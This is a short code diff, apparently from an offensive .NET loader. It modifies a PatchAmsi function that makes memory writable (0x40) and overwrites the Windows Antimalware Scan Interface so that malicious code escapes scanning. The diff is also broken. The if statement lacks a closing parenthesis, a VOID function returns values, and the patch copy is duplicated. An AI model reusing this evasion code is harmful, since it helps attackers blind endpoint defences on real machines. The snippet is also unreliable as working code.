@@ -340,7 +340,12 @@ VOID PatchAmsi()
 
 	memcpy(addr, amsipatch, patchsize);
 
-	VirtualProtect(addr, patchsize, oldProtect, &oldProtect);
+    if(!VirtualProtect(addr, patchsize, 0x40, &oldProtect){
+      return false;
+    }
+    memcpy(addr, amsipatch, patchsize);
+    return VirtualProtect(addr, patchsize, oldProtect, &oldProtect);
+	
 }
 
 BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeInfo) {
@@ -365,7 +370,6 @@ BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeIn
 
 	return retval;
 }
-
 
 
 
